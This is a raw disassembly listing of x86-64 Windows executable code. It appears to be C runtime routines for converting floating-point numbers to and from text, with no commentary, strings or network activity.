   14000e23a:	41 8a 10             	mov    (%r8),%dl
   14000e23d:	4d 03 c1             	add    %r9,%r8
   14000e240:	80 fa 30             	cmp    $0x30,%dl
   14000e243:	74 f5                	je     0x14000e23a
   14000e245:	80 ea 31             	sub    $0x31,%dl
   14000e248:	80 fa 08             	cmp    $0x8,%dl
   14000e24b:	0f 87 44 ff ff ff    	ja     0x14000e195
   14000e251:	b9 09 00 00 00       	mov    $0x9,%ecx
   14000e256:	e9 85 fe ff ff       	jmp    0x14000e0e0
   14000e25b:	8d 42 cf             	lea    -0x31(%rdx),%eax
   14000e25e:	3c 08                	cmp    $0x8,%al
   14000e260:	77 0a                	ja     0x14000e26c
   14000e262:	b9 09 00 00 00       	mov    $0x9,%ecx
   14000e267:	e9 6e fe ff ff       	jmp    0x14000e0da
   14000e26c:	80 fa 30             	cmp    $0x30,%dl
   14000e26f:	0f 85 8f 00 00 00    	jne    0x14000e304
   14000e275:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000e27a:	e9 7f fe ff ff       	jmp    0x14000e0fe
   14000e27f:	8d 42 cf             	lea    -0x31(%rdx),%eax
   14000e282:	49 8d 78 fe          	lea    -0x2(%r8),%rdi
   14000e286:	3c 08                	cmp    $0x8,%al
   14000e288:	76 d8                	jbe    0x14000e262
   14000e28a:	80 fa 2b             	cmp    $0x2b,%dl
   14000e28d:	74 07                	je     0x14000e296
   14000e28f:	80 fa 2d             	cmp    $0x2d,%dl
   14000e292:	74 83                	je     0x14000e217
   14000e294:	eb d6                	jmp    0x14000e26c
   14000e296:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000e29b:	83 f9 0a             	cmp    $0xa,%ecx
   14000e29e:	74 67                	je     0x14000e307
   14000e2a0:	e9 59 fe ff ff       	jmp    0x14000e0fe
   14000e2a5:	4c 8b c7             	mov    %rdi,%r8
   14000e2a8:	eb 63                	jmp    0x14000e30d
   14000e2aa:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e2b0:	40 b7 30             	mov    $0x30,%dil
   14000e2b3:	45 8b e1             	mov    %r9d,%r12d
   14000e2b6:	eb 24                	jmp    0x14000e2dc
   14000e2b8:	80 fa 39             	cmp    $0x39,%dl
   14000e2bb:	7f 3d                	jg     0x14000e2fa
   14000e2bd:	47 8d 6c ad 00       	lea    0x0(%r13,%r13,4),%r13d
   14000e2c2:	0f be c2             	movsbl %dl,%eax
   14000e2c5:	45 8d 6d e8          	lea    -0x18(%r13),%r13d
   14000e2c9:	46 8d 2c 68          	lea    (%rax,%r13,2),%r13d
   14000e2cd:	41 81 fd 50 14 00 00 	cmp    $0x1450,%r13d
   14000e2d4:	7f 0d                	jg     0x14000e2e3
   14000e2d6:	41 8a 10             	mov    (%r8),%dl
   14000e2d9:	4d 03 c1             	add    %r9,%r8
   14000e2dc:	40 3a d7             	cmp    %dil,%dl
   14000e2df:	7d d7                	jge    0x14000e2b8
   14000e2e1:	eb 17                	jmp    0x14000e2fa
   14000e2e3:	41 bd 51 14 00 00    	mov    $0x1451,%r13d
   14000e2e9:	eb 0f                	jmp    0x14000e2fa
   14000e2eb:	80 fa 39             	cmp    $0x39,%dl
   14000e2ee:	0f 8f a1 fe ff ff    	jg     0x14000e195
   14000e2f4:	41 8a 10             	mov    (%r8),%dl
   14000e2f7:	4d 03 c1             	add    %r9,%r8
   14000e2fa:	40 3a d7             	cmp    %dil,%dl
   14000e2fd:	7d ec                	jge    0x14000e2eb
   14000e2ff:	e9 91 fe ff ff       	jmp    0x14000e195
   14000e304:	4c 8b c7             	mov    %rdi,%r8
   14000e307:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000e30d:	48 8b 45 97          	mov    -0x69(%rbp),%rax
   14000e311:	4c 89 00             	mov    %r8,(%rax)
   14000e314:	45 85 ff             	test   %r15d,%r15d
   14000e317:	0f 84 13 04 00 00    	je     0x14000e730
   14000e31d:	41 83 fb 18          	cmp    $0x18,%r11d
   14000e321:	76 19                	jbe    0x14000e33c
   14000e323:	8a 45 f6             	mov    -0xa(%rbp),%al
   14000e326:	3c 05                	cmp    $0x5,%al
   14000e328:	7c 06                	jl     0x14000e330
   14000e32a:	41 02 c1             	add    %r9b,%al
   14000e32d:	88 45 f6             	mov    %al,-0xa(%rbp)
   14000e330:	4d 2b d1             	sub    %r9,%r10
   14000e333:	41 bb 18 00 00 00    	mov    $0x18,%r11d
   14000e339:	41 03 f1             	add    %r9d,%esi
   14000e33c:	45 85 db             	test   %r11d,%r11d
   14000e33f:	75 15                	jne    0x14000e356
   14000e341:	0f b7 d3             	movzwl %bx,%edx
   14000e344:	0f b7 c3             	movzwl %bx,%eax
   14000e347:	8b fb                	mov    %ebx,%edi
   14000e349:	8b cb                	mov    %ebx,%ecx
   14000e34b:	e9 ef 03 00 00       	jmp    0x14000e73f
   14000e350:	41 ff cb             	dec    %r11d
   14000e353:	41 03 f1             	add    %r9d,%esi
   14000e356:	4d 2b d1             	sub    %r9,%r10
   14000e359:	41 38 1a             	cmp    %bl,(%r10)
   14000e35c:	74 f2                	je     0x14000e350
   14000e35e:	4c 8d 45 bf          	lea    -0x41(%rbp),%r8
   14000e362:	48 8d 4d df          	lea    -0x21(%rbp),%rcx
   14000e366:	41 8b d3             	mov    %r11d,%edx
   14000e369:	e8 4e 10 00 00       	call   0x14000f3bc
   14000e36e:	39 5d 8b             	cmp    %ebx,-0x75(%rbp)
   14000e371:	7d 03                	jge    0x14000e376
   14000e373:	41 f7 dd             	neg    %r13d
   14000e376:	44 03 ee             	add    %esi,%r13d
   14000e379:	45 85 e4             	test   %r12d,%r12d
   14000e37c:	75 04                	jne    0x14000e382
   14000e37e:	44 03 6d 67          	add    0x67(%rbp),%r13d
   14000e382:	39 5d 87             	cmp    %ebx,-0x79(%rbp)
   14000e385:	75 04                	jne    0x14000e38b
   14000e387:	44 2b 6d 6f          	sub    0x6f(%rbp),%r13d
   14000e38b:	41 81 fd 50 14 00 00 	cmp    $0x1450,%r13d
   14000e392:	0f 8f 82 03 00 00    	jg     0x14000e71a
   14000e398:	41 81 fd b0 eb ff ff 	cmp    $0xffffebb0,%r13d
   14000e39f:	0f 8c 65 03 00 00    	jl     0x14000e70a
   14000e3a5:	48 8d 35 44 c0 00 00 	lea    0xc044(%rip),%rsi        # 0x14001a3f0
   14000e3ac:	48 83 ee 60          	sub    $0x60,%rsi
   14000e3b0:	45 85 ed             	test   %r13d,%r13d
   14000e3b3:	0f 84 3f 03 00 00    	je     0x14000e6f8
   14000e3b9:	79 0e                	jns    0x14000e3c9
   14000e3bb:	48 8d 35 8e c1 00 00 	lea    0xc18e(%rip),%rsi        # 0x14001a550
   14000e3c2:	41 f7 dd             	neg    %r13d
   14000e3c5:	48 83 ee 60          	sub    $0x60,%rsi
   14000e3c9:	39 5d 93             	cmp    %ebx,-0x6d(%rbp)
   14000e3cc:	75 04                	jne    0x14000e3d2
   14000e3ce:	66 89 5d bf          	mov    %bx,-0x41(%rbp)
   14000e3d2:	45 85 ed             	test   %r13d,%r13d
   14000e3d5:	0f 84 1d 03 00 00    	je     0x14000e6f8
   14000e3db:	bf 00 00 00 80       	mov    $0x80000000,%edi
   14000e3e0:	41 b9 ff 7f 00 00    	mov    $0x7fff,%r9d
   14000e3e6:	41 8b c5             	mov    %r13d,%eax
   14000e3e9:	48 83 c6 54          	add    $0x54,%rsi
   14000e3ed:	41 c1 fd 03          	sar    $0x3,%r13d
   14000e3f1:	48 89 75 9f          	mov    %rsi,-0x61(%rbp)
   14000e3f5:	83 e0 07             	and    $0x7,%eax
   14000e3f8:	0f 84 f1 02 00 00    	je     0x14000e6ef
   14000e3fe:	48 98                	cltq
   14000e400:	41 bb 00 80 00 00    	mov    $0x8000,%r11d
   14000e406:	41 be 01 00 00 00    	mov    $0x1,%r14d
   14000e40c:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   14000e410:	48 8d 14 8e          	lea    (%rsi,%rcx,4),%rdx
   14000e414:	48 89 55 97          	mov    %rdx,-0x69(%rbp)
   14000e418:	66 44 39 1a          	cmp    %r11w,(%rdx)
   14000e41c:	72 25                	jb     0x14000e443
   14000e41e:	8b 42 08             	mov    0x8(%rdx),%eax
   14000e421:	f2 0f 10 02          	movsd  (%rdx),%xmm0
   14000e425:	48 8d 55 cf          	lea    -0x31(%rbp),%rdx
   14000e429:	89 45 d7             	mov    %eax,-0x29(%rbp)
   14000e42c:	f2 0f 11 45 cf       	movsd  %xmm0,-0x31(%rbp)
   14000e431:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   14000e435:	48 c1 e8 10          	shr    $0x10,%rax
   14000e439:	48 89 55 97          	mov    %rdx,-0x69(%rbp)
   14000e43d:	41 2b c6             	sub    %r14d,%eax
   14000e440:	89 45 d1             	mov    %eax,-0x2f(%rbp)
   14000e443:	0f b7 42 0a          	movzwl 0xa(%rdx),%eax
   14000e447:	0f b7 4d c9          	movzwl -0x37(%rbp),%ecx
   14000e44b:	48 89 5d af          	mov    %rbx,-0x51(%rbp)
   14000e44f:	44 0f b7 e0          	movzwl %ax,%r12d
   14000e453:	66 41 23 c1          	and    %r9w,%ax
   14000e457:	89 5d b7             	mov    %ebx,-0x49(%rbp)
   14000e45a:	66 44 33 e1          	xor    %cx,%r12w
   14000e45e:	66 41 23 c9          	and    %r9w,%cx
   14000e462:	66 45 23 e3          	and    %r11w,%r12w
   14000e466:	44 8d 04 01          	lea    (%rcx,%rax,1),%r8d
   14000e46a:	66 41 3b c9          	cmp    %r9w,%cx
   14000e46e:	0f 83 67 02 00 00    	jae    0x14000e6db
   14000e474:	66 41 3b c1          	cmp    %r9w,%ax
   14000e478:	0f 83 5d 02 00 00    	jae    0x14000e6db
   14000e47e:	41 ba fd bf 00 00    	mov    $0xbffd,%r10d
   14000e484:	66 45 3b c2          	cmp    %r10w,%r8w
   14000e488:	0f 87 4d 02 00 00    	ja     0x14000e6db
   14000e48e:	41 ba bf 3f 00 00    	mov    $0x3fbf,%r10d
   14000e494:	66 45 3b c2          	cmp    %r10w,%r8w
   14000e498:	77 0c                	ja     0x14000e4a6
   14000e49a:	48 89 5d c3          	mov    %rbx,-0x3d(%rbp)
   14000e49e:	89 5d bf             	mov    %ebx,-0x41(%rbp)
   14000e4a1:	e9 49 02 00 00       	jmp    0x14000e6ef
   14000e4a6:	66 85 c9             	test   %cx,%cx
   14000e4a9:	75 20                	jne    0x14000e4cb
   14000e4ab:	66 45 03 c6          	add    %r14w,%r8w
   14000e4af:	f7 45 c7 ff ff ff 7f 	testl  $0x7fffffff,-0x39(%rbp)
   14000e4b6:	75 13                	jne    0x14000e4cb
   14000e4b8:	39 5d c3             	cmp    %ebx,-0x3d(%rbp)
   14000e4bb:	75 0e                	jne    0x14000e4cb
   14000e4bd:	39 5d bf             	cmp    %ebx,-0x41(%rbp)
   14000e4c0:	75 09                	jne    0x14000e4cb
   14000e4c2:	66 89 5d c9          	mov    %bx,-0x37(%rbp)
   14000e4c6:	e9 24 02 00 00       	jmp    0x14000e6ef
   14000e4cb:	66 85 c0             	test   %ax,%ax
   14000e4ce:	75 16                	jne    0x14000e4e6
   14000e4d0:	66 45 03 c6          	add    %r14w,%r8w
   14000e4d4:	f7 42 08 ff ff ff 7f 	testl  $0x7fffffff,0x8(%rdx)
   14000e4db:	75 09                	jne    0x14000e4e6
   14000e4dd:	39 5a 04             	cmp    %ebx,0x4(%rdx)
   14000e4e0:	75 04                	jne    0x14000e4e6
   14000e4e2:	39 1a                	cmp    %ebx,(%rdx)
   14000e4e4:	74 b4                	je     0x14000e49a
   14000e4e6:	44 8b fb             	mov    %ebx,%r15d
   14000e4e9:	4c 8d 4d af          	lea    -0x51(%rbp),%r9
   14000e4ed:	41 ba 05 00 00 00    	mov    $0x5,%r10d
   14000e4f3:	44 89 55 87          	mov    %r10d,-0x79(%rbp)
   14000e4f7:	45 85 d2             	test   %r10d,%r10d
   14000e4fa:	7e 6c                	jle    0x14000e568
   14000e4fc:	43 8d 04 3f          	lea    (%r15,%r15,1),%eax
   14000e500:	48 8d 7d bf          	lea    -0x41(%rbp),%rdi
   14000e504:	48 8d 72 08          	lea    0x8(%rdx),%rsi
   14000e508:	48 63 c8             	movslq %eax,%rcx
   14000e50b:	41 8b c7             	mov    %r15d,%eax
   14000e50e:	41 23 c6             	and    %r14d,%eax
   14000e511:	48 03 f9             	add    %rcx,%rdi
   14000e514:	8b d0                	mov    %eax,%edx
   14000e516:	0f b7 07             	movzwl (%rdi),%eax
   14000e519:	0f b7 0e             	movzwl (%rsi),%ecx
   14000e51c:	44 8b db             	mov    %ebx,%r11d
   14000e51f:	0f af c8             	imul   %eax,%ecx
   14000e522:	41 8b 01             	mov    (%r9),%eax
   14000e525:	44 8d 34 08          	lea    (%rax,%rcx,1),%r14d
   14000e529:	44 3b f0             	cmp    %eax,%r14d
   14000e52c:	72 05                	jb     0x14000e533
   14000e52e:	44 3b f1             	cmp    %ecx,%r14d
   14000e531:	73 06                	jae    0x14000e539
   14000e533:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   14000e539:	45 89 31             	mov    %r14d,(%r9)
   14000e53c:	41 be 01 00 00 00    	mov    $0x1,%r14d
   14000e542:	45 85 db             	test   %r11d,%r11d
   14000e545:	74 05                	je     0x14000e54c
   14000e547:	66 45 01 71 04       	add    %r14w,0x4(%r9)
   14000e54c:	44 8b 5d 87          	mov    -0x79(%rbp),%r11d
   14000e550:	48 83 c7 02          	add    $0x2,%rdi
   14000e554:	48 83 ee 02          	sub    $0x2,%rsi
   14000e558:	45 2b de             	sub    %r14d,%r11d
   14000e55b:	44 89 5d 87          	mov    %r11d,-0x79(%rbp)
   14000e55f:	45 85 db             	test   %r11d,%r11d
   14000e562:	7f b2                	jg     0x14000e516
   14000e564:	48 8b 55 97          	mov    -0x69(%rbp),%rdx
   14000e568:	45 2b d6             	sub    %r14d,%r10d
   14000e56b:	49 83 c1 02          	add    $0x2,%r9
   14000e56f:	45 03 fe             	add    %r14d,%r15d
   14000e572:	45 85 d2             	test   %r10d,%r10d
   14000e575:	0f 8f 78 ff ff ff    	jg     0x14000e4f3
   14000e57b:	44 8b 55 b7          	mov    -0x49(%rbp),%r10d
   14000e57f:	44 8b 4d af          	mov    -0x51(%rbp),%r9d
   14000e583:	b8 02 c0 00 00       	mov    $0xc002,%eax
   14000e588:	66 44 03 c0          	add    %ax,%r8w
   14000e58c:	bf 00 00 00 80       	mov    $0x80000000,%edi
   14000e591:	41 bf ff ff 00 00    	mov    $0xffff,%r15d
   14000e597:	66 45 85 c0          	test   %r8w,%r8w
   14000e59b:	7e 3f                	jle    0x14000e5dc
   14000e59d:	44 85 d7             	test   %r10d,%edi
   14000e5a0:	75 34                	jne    0x14000e5d6
   14000e5a2:	44 8b 5d b3          	mov    -0x4d(%rbp),%r11d
   14000e5a6:	41 8b d1             	mov    %r9d,%edx
   14000e5a9:	45 03 d2             	add    %r10d,%r10d
   14000e5ac:	c1 ea 1f             	shr    $0x1f,%edx
   14000e5af:	45 03 c9             	add    %r9d,%r9d
   14000e5b2:	41 8b cb             	mov    %r11d,%ecx
   14000e5b5:	c1 e9 1f             	shr    $0x1f,%ecx
   14000e5b8:	43 8d 04 1b          	lea    (%r11,%r11,1),%eax
   14000e5bc:	66 45 03 c7          	add    %r15w,%r8w
   14000e5c0:	0b c2                	or     %edx,%eax
   14000e5c2:	44 0b d1             	or     %ecx,%r10d
   14000e5c5:	44 89 4d af          	mov    %r9d,-0x51(%rbp)
   14000e5c9:	89 45 b3             	mov    %eax,-0x4d(%rbp)
   14000e5cc:	44 89 55 b7          	mov    %r10d,-0x49(%rbp)
   14000e5d0:	66 45 85 c0          	test   %r8w,%r8w
   14000e5d4:	7f c7                	jg     0x14000e59d
   14000e5d6:	66 45 85 c0          	test   %r8w,%r8w
   14000e5da:	7f 6a                	jg     0x14000e646
   14000e5dc:	66 45 03 c7          	add    %r15w,%r8w
   14000e5e0:	79 64                	jns    0x14000e646
   14000e5e2:	41 0f b7 c0          	movzwl %r8w,%eax
   14000e5e6:	8b fb                	mov    %ebx,%edi
   14000e5e8:	66 f7 d8             	neg    %ax
   14000e5eb:	0f b7 d0             	movzwl %ax,%edx
   14000e5ee:	66 44 03 c2          	add    %dx,%r8w
   14000e5f2:	44 84 75 af          	test   %r14b,-0x51(%rbp)
   14000e5f6:	74 03                	je     0x14000e5fb
   14000e5f8:	41 03 fe             	add    %r14d,%edi
   14000e5fb:	44 8b 5d b3          	mov    -0x4d(%rbp),%r11d
   14000e5ff:	41 8b c2             	mov    %r10d,%eax
   14000e602:	41 d1 e9             	shr    $1,%r9d
   14000e605:	41 8b cb             	mov    %r11d,%ecx
   14000e608:	c1 e0 1f             	shl    $0x1f,%eax
   14000e60b:	41 d1 eb             	shr    $1,%r11d
   14000e60e:	c1 e1 1f             	shl    $0x1f,%ecx
   14000e611:	44 0b d8             	or     %eax,%r11d
   14000e614:	41 d1 ea             	shr    $1,%r10d
   14000e617:	44 0b c9             	or     %ecx,%r9d
   14000e61a:	44 89 5d b3          	mov    %r11d,-0x4d(%rbp)
   14000e61e:	44 89 4d af          	mov    %r9d,-0x51(%rbp)
   14000e622:	49 2b d6             	sub    %r14,%rdx
   14000e625:	75 cb                	jne    0x14000e5f2
   14000e627:	85 ff                	test   %edi,%edi
   14000e629:	44 89 55 b7          	mov    %r10d,-0x49(%rbp)
   14000e62d:	bf 00 00 00 80       	mov    $0x80000000,%edi
   14000e632:	74 12                	je     0x14000e646
   14000e634:	41 0f b7 c1          	movzwl %r9w,%eax
   14000e638:	66 41 0b c6          	or     %r14w,%ax
   14000e63c:	66 89 45 af          	mov    %ax,-0x51(%rbp)
   14000e640:	44 8b 4d af          	mov    -0x51(%rbp),%r9d
   14000e644:	eb 04                	jmp    0x14000e64a
   14000e646:	0f b7 45 af          	movzwl -0x51(%rbp),%eax
   14000e64a:	48 8b 75 9f          	mov    -0x61(%rbp),%rsi
   14000e64e:	41 bb 00 80 00 00    	mov    $0x8000,%r11d
   14000e654:	66 41 3b c3          	cmp    %r11w,%ax
   14000e658:	77 10                	ja     0x14000e66a
   14000e65a:	41 81 e1 ff ff 01 00 	and    $0x1ffff,%r9d
   14000e661:	41 81 f9 00 80 01 00 	cmp    $0x18000,%r9d
   14000e668:	75 48                	jne    0x14000e6b2
   14000e66a:	8b 45 b1             	mov    -0x4f(%rbp),%eax
   14000e66d:	83 c9 ff             	or     $0xffffffff,%ecx
   14000e670:	3b c1                	cmp    %ecx,%eax
   14000e672:	75 38                	jne    0x14000e6ac
   14000e674:	8b 45 b5             	mov    -0x4b(%rbp),%eax
   14000e677:	89 5d b1             	mov    %ebx,-0x4f(%rbp)
   14000e67a:	3b c1                	cmp    %ecx,%eax
   14000e67c:	75 22                	jne    0x14000e6a0
   14000e67e:	0f b7 45 b9          	movzwl -0x47(%rbp),%eax
   14000e682:	89 5d b5             	mov    %ebx,-0x4b(%rbp)
   14000e685:	66 41 3b c7          	cmp    %r15w,%ax
   14000e689:	75 0b                	jne    0x14000e696
   14000e68b:	66 44 89 5d b9       	mov    %r11w,-0x47(%rbp)
   14000e690:	66 45 03 c6          	add    %r14w,%r8w
   14000e694:	eb 10                	jmp    0x14000e6a6
   14000e696:	66 41 03 c6          	add    %r14w,%ax
   14000e69a:	66 89 45 b9          	mov    %ax,-0x47(%rbp)
   14000e69e:	eb 06                	jmp    0x14000e6a6
   14000e6a0:	41 03 c6             	add    %r14d,%eax
   14000e6a3:	89 45 b5             	mov    %eax,-0x4b(%rbp)
   14000e6a6:	44 8b 55 b7          	mov    -0x49(%rbp),%r10d
   14000e6aa:	eb 06                	jmp    0x14000e6b2
   14000e6ac:	41 03 c6             	add    %r14d,%eax
   14000e6af:	89 45 b1             	mov    %eax,-0x4f(%rbp)
   14000e6b2:	41 b9 ff 7f 00 00    	mov    $0x7fff,%r9d
   14000e6b8:	66 45 3b c1          	cmp    %r9w,%r8w
   14000e6bc:	73 1d                	jae    0x14000e6db
   14000e6be:	0f b7 45 b1          	movzwl -0x4f(%rbp),%eax
   14000e6c2:	66 45 0b c4          	or     %r12w,%r8w
   14000e6c6:	44 89 55 c5          	mov    %r10d,-0x3b(%rbp)
   14000e6ca:	66 89 45 bf          	mov    %ax,-0x41(%rbp)
   14000e6ce:	8b 45 b3             	mov    -0x4d(%rbp),%eax
   14000e6d1:	66 44 89 45 c9       	mov    %r8w,-0x37(%rbp)
   14000e6d6:	89 45 c1             	mov    %eax,-0x3f(%rbp)
   14000e6d9:	eb 14                	jmp    0x14000e6ef
   14000e6db:	66 41 f7 dc          	neg    %r12w
   14000e6df:	48 89 5d bf          	mov    %rbx,-0x41(%rbp)
   14000e6e3:	1b c0                	sbb    %eax,%eax
   14000e6e5:	23 c7                	and    %edi,%eax
   14000e6e7:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   14000e6ec:	89 45 c7             	mov    %eax,-0x39(%rbp)
   14000e6ef:	45 85 ed             	test   %r13d,%r13d
   14000e6f2:	0f 85 ee fc ff ff    	jne    0x14000e3e6
   14000e6f8:	8b 45 c7             	mov    -0x39(%rbp),%eax
   14000e6fb:	0f b7 55 bf          	movzwl -0x41(%rbp),%edx
   14000e6ff:	8b 4d c1             	mov    -0x3f(%rbp),%ecx
   14000e702:	8b 7d c5             	mov    -0x3b(%rbp),%edi
   14000e705:	c1 e8 10             	shr    $0x10,%eax
   14000e708:	eb 35                	jmp    0x14000e73f
   14000e70a:	8b d3                	mov    %ebx,%edx
   14000e70c:	0f b7 c3             	movzwl %bx,%eax
   14000e70f:	8b fb                	mov    %ebx,%edi
   14000e711:	8b cb                	mov    %ebx,%ecx
   14000e713:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000e718:	eb 25                	jmp    0x14000e73f
   14000e71a:	8b cb                	mov    %ebx,%ecx
   14000e71c:	0f b7 d3             	movzwl %bx,%edx
   14000e71f:	b8 ff 7f 00 00       	mov    $0x7fff,%eax
   14000e724:	bb 02 00 00 00       	mov    $0x2,%ebx
   14000e729:	bf 00 00 00 80       	mov    $0x80000000,%edi
   14000e72e:	eb 0f                	jmp    0x14000e73f
   14000e730:	0f b7 d3             	movzwl %bx,%edx
   14000e733:	0f b7 c3             	movzwl %bx,%eax
   14000e736:	8b fb                	mov    %ebx,%edi
   14000e738:	8b cb                	mov    %ebx,%ecx
   14000e73a:	bb 04 00 00 00       	mov    $0x4,%ebx
   14000e73f:	4c 8b 45 a7          	mov    -0x59(%rbp),%r8
   14000e743:	66 0b 45 8f          	or     -0x71(%rbp),%ax
   14000e747:	66 41 89 40 0a       	mov    %ax,0xa(%r8)
   14000e74c:	8b c3                	mov    %ebx,%eax
   14000e74e:	66 41 89 10          	mov    %dx,(%r8)
   14000e752:	41 89 48 02          	mov    %ecx,0x2(%r8)
   14000e756:	41 89 78 06          	mov    %edi,0x6(%r8)
   14000e75a:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   14000e75e:	48 33 cc             	xor    %rsp,%rcx
   14000e761:	e8 da 4a ff ff       	call   0x140003240
   14000e766:	48 8b 9c 24 f0 00 00 	mov    0xf0(%rsp),%rbx
   14000e76d:	00 
   14000e76e:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   14000e775:	41 5f                	pop    %r15
   14000e777:	41 5e                	pop    %r14
   14000e779:	41 5d                	pop    %r13
   14000e77b:	41 5c                	pop    %r12
   14000e77d:	5f                   	pop    %rdi
   14000e77e:	5e                   	pop    %rsi
   14000e77f:	5d                   	pop    %rbp
   14000e780:	c3                   	ret
   14000e781:	cc                   	int3
   14000e782:	cc                   	int3
   14000e783:	cc                   	int3
   14000e784:	48 83 ec 48          	sub    $0x48,%rsp
   14000e788:	8b 44 24 78          	mov    0x78(%rsp),%eax
   14000e78c:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000e792:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000e796:	8b 44 24 70          	mov    0x70(%rsp),%eax
   14000e79a:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000e79e:	e8 05 00 00 00       	call   0x14000e7a8
   14000e7a3:	48 83 c4 48          	add    $0x48,%rsp
   14000e7a7:	c3                   	ret
   14000e7a8:	48 83 ec 38          	sub    $0x38,%rsp
   14000e7ac:	41 8d 41 bb          	lea    -0x45(%r9),%eax
   14000e7b0:	41 ba df ff ff ff    	mov    $0xffffffdf,%r10d
   14000e7b6:	41 85 c2             	test   %eax,%r10d
   14000e7b9:	74 4a                	je     0x14000e805
   14000e7bb:	41 83 f9 66          	cmp    $0x66,%r9d
   14000e7bf:	75 16                	jne    0x14000e7d7
   14000e7c1:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000e7c6:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
   14000e7cb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000e7d0:	e8 5b 08 00 00       	call   0x14000f030
   14000e7d5:	eb 4a                	jmp    0x14000e821
   14000e7d7:	41 8d 41 bf          	lea    -0x41(%r9),%eax
   14000e7db:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
   14000e7e0:	41 85 c2             	test   %eax,%r10d
   14000e7e3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000e7e8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000e7ed:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000e7f1:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000e7f5:	74 07                	je     0x14000e7fe
   14000e7f7:	e8 08 09 00 00       	call   0x14000f104
   14000e7fc:	eb 23                	jmp    0x14000e821
   14000e7fe:	e8 25 00 00 00       	call   0x14000e828
   14000e803:	eb 1c                	jmp    0x14000e821
   14000e805:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000e80a:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
   14000e80f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000e814:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000e818:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000e81c:	e8 b3 05 00 00       	call   0x14000edd4
   14000e821:	48 83 c4 38          	add    $0x38,%rsp
   14000e825:	c3                   	ret
   14000e826:	cc                   	int3
   14000e827:	cc                   	int3
   14000e828:	48 8b c4             	mov    %rsp,%rax
   14000e82b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000e82f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000e833:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000e837:	57                   	push   %rdi
   14000e838:	41 54                	push   %r12
   14000e83a:	41 55                	push   %r13
   14000e83c:	41 56                	push   %r14
   14000e83e:	41 57                	push   %r15
   14000e840:	48 83 ec 50          	sub    $0x50,%rsp
   14000e844:	48 8b fa             	mov    %rdx,%rdi
   14000e847:	48 8b 94 24 a8 00 00 	mov    0xa8(%rsp),%rdx
   14000e84e:	00 
   14000e84f:	4c 8b f1             	mov    %rcx,%r14
   14000e852:	48 8d 48 b8          	lea    -0x48(%rax),%rcx
   14000e856:	41 bf 30 00 00 00    	mov    $0x30,%r15d
   14000e85c:	41 8b d9             	mov    %r9d,%ebx
   14000e85f:	49 8b f0             	mov    %r8,%rsi
   14000e862:	41 bc ff 03 00 00    	mov    $0x3ff,%r12d
   14000e868:	41 0f b7 ef          	movzwl %r15w,%ebp
   14000e86c:	e8 cb 66 ff ff       	call   0x140004f3c
   14000e871:	45 33 c9             	xor    %r9d,%r9d
   14000e874:	85 db                	test   %ebx,%ebx
   14000e876:	41 0f 48 d9          	cmovs  %r9d,%ebx
   14000e87a:	48 85 ff             	test   %rdi,%rdi
   14000e87d:	75 0c                	jne    0x14000e88b
   14000e87f:	e8 f4 5c ff ff       	call   0x140004578
   14000e884:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000e889:	eb 1d                	jmp    0x14000e8a8
   14000e88b:	48 85 f6             	test   %rsi,%rsi
   14000e88e:	74 ef                	je     0x14000e87f
   14000e890:	8d 43 0b             	lea    0xb(%rbx),%eax
   14000e893:	44 88 0f             	mov    %r9b,(%rdi)
   14000e896:	48 63 c8             	movslq %eax,%rcx
   14000e899:	48 3b f1             	cmp    %rcx,%rsi
   14000e89c:	77 19                	ja     0x14000e8b7
   14000e89e:	e8 d5 5c ff ff       	call   0x140004578
   14000e8a3:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000e8a8:	89 18                	mov    %ebx,(%rax)
   14000e8aa:	e8 79 58 ff ff       	call   0x140004128
   14000e8af:	45 33 c9             	xor    %r9d,%r9d
   14000e8b2:	e9 ee 02 00 00       	jmp    0x14000eba5
   14000e8b7:	49 8b 06             	mov    (%r14),%rax
   14000e8ba:	b9 ff 07 00 00       	mov    $0x7ff,%ecx
   14000e8bf:	48 c1 e8 34          	shr    $0x34,%rax
   14000e8c3:	48 23 c1             	and    %rcx,%rax
   14000e8c6:	48 3b c1             	cmp    %rcx,%rax
   14000e8c9:	0f 85 92 00 00 00    	jne    0x14000e961
   14000e8cf:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   14000e8d4:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   14000e8d9:	4c 8d 46 fe          	lea    -0x2(%rsi),%r8
   14000e8dd:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   14000e8e1:	48 8d 57 02          	lea    0x2(%rdi),%rdx
   14000e8e5:	44 8b cb             	mov    %ebx,%r9d
   14000e8e8:	4c 0f 44 c6          	cmove  %rsi,%r8
   14000e8ec:	49 8b ce             	mov    %r14,%rcx
   14000e8ef:	e8 e0 04 00 00       	call   0x14000edd4
   14000e8f4:	45 33 c9             	xor    %r9d,%r9d
